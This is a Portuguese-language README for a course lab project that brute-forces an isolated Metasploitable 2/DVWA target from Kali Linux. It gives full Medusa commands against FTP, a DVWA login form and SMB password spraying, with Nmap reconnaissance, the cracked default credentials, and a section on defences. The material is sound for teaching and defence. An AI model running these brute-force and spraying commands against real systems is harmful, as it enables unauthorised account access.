# Força bruta com Medusa e Kali Linux

Este repositório é o meu projeto para o desafio da DIO sobre ataques de força
bruta. A ideia foi montar um laboratório isolado, atacar alguns serviços
conhecidos por serem vulneráveis e, principalmente, entender **por que** esses
ataques funcionam e como me defender deles.

Trabalhei com o Kali Linux como máquina atacante e o Metasploitable 2 (que já
traz o DVWA) como alvo. A ferramenta principal foi o Medusa, mas também usei
Nmap e enum4linux no caminho.

> **Importante:** tudo aqui foi feito em máquinas virtuais minhas, numa rede
> fechada, sem acesso à internet. Rodar esse tipo de ataque contra sistemas de
> terceiros sem autorização é crime (Lei 12.737/2012 e Lei 14.155/2021). Use
> só no seu próprio laboratório.

## O que tem neste repositório

```
.
├── README.md
├── wordlists/      # listas de usuários e senhas usadas nos testes
├── scripts/        # os comandos de cada cenário, prontos para rodar
└── images/         # onde ficam as evidências (prints) dos testes
```

## Sumário

- [Um pouco de teoria](#um-pouco-de-teoria)
- [Ferramentas](#ferramentas)
- [Como montei o laboratório](#como-montei-o-laboratório)
- [Reconhecimento com Nmap](#reconhecimento-com-nmap)
- [Cenário 1 – FTP](#cenário-1--ftp)
- [Cenário 2 – formulário web (DVWA)](#cenário-2--formulário-web-dvwa)
- [Cenário 3 – password spraying em SMB](#cenário-3--password-spraying-em-smb)
- [Wordlists](#wordlists)
- [Como me defender disso](#como-me-defender-disso)
- [O que eu tirei desse projeto](#o-que-eu-tirei-desse-projeto)
- [Referências](#referências)

## Um pouco de teoria

Força bruta, no fundo, é tentativa e erro automatizada: o programa testa várias
credenciais até acertar uma. Na prática, quase ninguém testa "todas as
combinações possíveis" porque demora demais — o que funciona de verdade são as
variações abaixo.

- **Ataque por dicionário:** usa uma lista de senhas prováveis (as famosas
  `rockyou.txt` da vida). É rápido e derruba senha fraca na hora.
- **Credential stuffing:** reaproveita usuário e senha que já vazaram em outro
  serviço, apostando que a pessoa repetiu a senha.
- **Password spraying:** testa poucas senhas comuns contra muitos usuários. A
  sacada é não estourar o limite de tentativas de nenhuma conta, o que torna o
  ataque bem mais difícil de notar.

O ponto que ficou claro pra mim é que o sucesso desses ataques depende muito mais
de **senha fraca e falta de proteção** do que de poder de processamento.

## Ferramentas

| Ferramenta | Pra que serve aqui |
|------------|--------------------|
| VirtualBox | Rodar as duas máquinas virtuais |
| Kali Linux | Máquina atacante |
| Metasploitable 2 | Alvo vulnerável (FTP, SMB e o DVWA) |
| Medusa | Fazer a força bruta nos serviços |
| Nmap | Descobrir quais portas/serviços estão abertos |
| enum4linux | Enumerar usuários no SMB |

Escolhi o Medusa porque ele é rápido, trabalha com vários logins em paralelo e
suporta um monte de protocolo (FTP, HTTP, SMB, SSH, MySQL...). Para ver todos os
módulos:

```bash
medusa -d
```

As flags que mais usei:

| Flag | O que faz |
|------|-----------|
| `-h` | Host alvo |
| `-u` / `-U` | Um usuário / arquivo com vários usuários |
| `-p` / `-P` | Uma senha / arquivo com várias senhas |
| `-M` | Qual módulo/serviço (ftp, http, smbnt...) |
| `-t` | Quantos logins em paralelo |
| `-f` | Para assim que achar a primeira credencial válida |
| `-O` | Salva o resultado em um arquivo |

## Como montei o laboratório

A ideia é ter duas VMs conversando só entre si, sem tocar na internet:

```
VirtualBox - Rede interna (host-only) 192.168.56.0/24

  [ Kali Linux ]  ---->  [ Metasploitable 2 + DVWA ]
    .56.101                      .56.102
   (atacante)                     (alvo)
```

O que eu fiz:

1. No VirtualBox, criei uma rede host-only (ou "Rede Interna" com o mesmo nome
   nas duas VMs).
2. Em cada VM, apontei o Adaptador 1 para essa rede.
3. Descobri os IPs e confirmei que uma enxergava a outra.

```bash
# no Kali, descobrir meu IP
ip a

# descobrir quem está vivo na rede
nmap -sn 192.168.56.0/24

# testar se chego no alvo
ping -c 3 192.168.56.102
```

O Metasploitable 2 vem com login padrão `msfadmin` / `msfadmin` — já adianto que
isso vai ser importante mais pra frente.

## Reconhecimento com Nmap

Antes de sair atacando, primeiro olhei o que estava aberto. Não faz sentido
tentar força bruta num serviço que nem está rodando.

```bash
nmap -sV -p- 192.168.56.102 -oN images/nmap_full.txt
```

Resumo do que apareceu:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.X
3306/tcp open  mysql       MySQL 5.0.51a
```

As portas que me interessavam: 21 (FTP), 80 (o DVWA) e 445 (SMB). Cada uma virou
um cenário.

## Cenário 1 – FTP

O FTP (vsftpd na porta 21) foi o mais direto. Joguei minha lista de usuários
contra a de senhas:

```bash
medusa -h 192.168.56.102 \
       -U wordlists/users.txt \
       -P wordlists/passwords.txt \
       -M ftp \
       -t 4 \
       -f \
       -O images/ftp_resultado.txt
```

Quando ele acha, a saída é bem clara:

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

Depois é só confirmar que a credencial funciona mesmo:

```bash
ftp 192.168.56.102
# usuário: msfadmin / senha: msfadmin
# ftp> ls   -> consegui listar os arquivos, acesso confirmado
```

## Cenário 2 – formulário web (DVWA)

Esse foi o mais chatinho de configurar, porque força bruta em formulário web
depende de dois detalhes: o **cookie de sessão** e a **mensagem de erro** da
página.

Preparação:

1. Entrei no DVWA (`http://192.168.56.102/dvwa`, login `admin` / `password`).
2. Coloquei a segurança em **Low**.
3. Peguei o `PHPSESSID` no DevTools (aba Application / Network).

O formulário manda os campos por GET e, quando erra, mostra a frase
`Username and/or password incorrect.`. É exatamente essa frase que o Medusa usa
para saber que a tentativa falhou (tudo que **não** tiver essa frase é sucesso):

```bash
medusa -h 192.168.56.102 \
       -u admin \
       -P wordlists/passwords.txt \
       -M http \
       -m DIR:/dvwa/vulnerabilities/brute/ \
       -m METHOD:GET \
       -m FORM-DATA:"username=&password=&Login=Login" \
       -m DENY-SIGNAL:"Username and/or password incorrect." \
       -m COOKIE:"security=low; PHPSESSID=SEU_PHPSESSID" \
       -t 3 \
       -O images/dvwa_resultado.txt
```

Resultado:

```
ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
```

Obs.: pra formulário web muita gente prefere o Hydra, mas como o desafio é sobre
o Medusa, mantive ele aqui. O raciocínio é o mesmo.

## Cenário 3 – password spraying em SMB

Aqui a estratégia muda: em vez de muitas senhas num usuário, testei poucas senhas
em vários usuários. Primeiro enumerei quem existe:

```bash
enum4linux -U 192.168.56.102
# alternativa:
nmap --script smb-enum-users -p 445 192.168.56.102
```

Com a lista de usuários em mãos, rodei o spraying:

```bash
medusa -h 192.168.56.102 \
       -U wordlists/users.txt \
       -p "msfadmin" \
       -M smbnt \
       -t 1 \
       -O images/smb_resultado.txt
```

Repara no `-p` (uma senha só) e no `-t 1` (bem devagar) — é assim que o ataque
passa despercebido.

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

## Wordlists

Deixei na pasta `wordlists/` listas pequenas e didáticas, só pra demonstrar:

- `users.txt` – usuários comuns
- `passwords.txt` – senhas fracas típicas
- `spray.txt` – senhas pro cenário de spraying

No dia a dia, o Kali já traz listas bem maiores em `/usr/share/wordlists/`. A
rockyou, por exemplo, tem uns 14 milhões de senhas:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt
```

Se eu quiser gerar uma lista própria, dá pra usar o crunch (deixei um exemplo em
`scripts/gerar_wordlist.sh`).

## Como me defender disso

Essa foi, pra mim, a parte mais importante do desafio. Cada falha que explorei
tem uma defesa direta:

| Problema | O que resolve |
|----------|---------------|
| Senha fraca | Política de senha forte e bloqueio de senhas óbvias/vazadas |
| Tentativas infinitas | Bloquear a conta (ou atrasar) depois de X erros |
| Automação | Rate limiting, CAPTCHA e limite de tentativas por IP |
| Só senha | Ativar MFA/2FA — mesmo com a senha, não entra |
| Serviço exposto | Fechar portas que não precisam, firewall, trocar FTP puro por SFTP |
| Protocolo velho | Atualizar Samba/vsftpd e desligar SMBv1 |
| Sem monitorar | Logs e alertas; o `fail2ban` banir IP com muita falha ajuda bastante |
| Senha padrão | Trocar toda senha default no primeiro acesso |

Um exemplo prático do lado defensor, com fail2ban:

```bash
sudo apt install fail2ban -y
sudo systemctl enable --now fail2ban
# ele monitora os logs e bane IPs que erram muito o login
```

## O que eu tirei desse projeto

- Força bruta é barata e eficiente contra senha fraca. A defesa começa na
  qualidade da senha e no segundo fator.
- Fazer reconhecimento (Nmap) antes economiza tempo — só ataquei o que estava
  realmente aberto.
- O password spraying me abriu os olhos: por evitar o bloqueio de conta, é
  bem mais silencioso, então o monitoramento tem que olhar o conjunto, não só
  tentativa por tentativa.
- Em formulário web, acertar o cookie e a mensagem de erro é metade da batalha.
- No fim, defesa boa é em camadas: senha forte + bloqueio + rate limit + MFA +
  log. Quebra qualquer etapa do ataque.

## Referências

- [Kali Linux](https://www.kali.org/)
- [Medusa](http://www.foofus.net/jmk/medusa/medusa.html)
- [DVWA](https://github.com/digininja/DVWA)
- [Nmap](https://nmap.org/book/)
- [Metasploitable 2 (Rapid7)](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [OWASP – Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
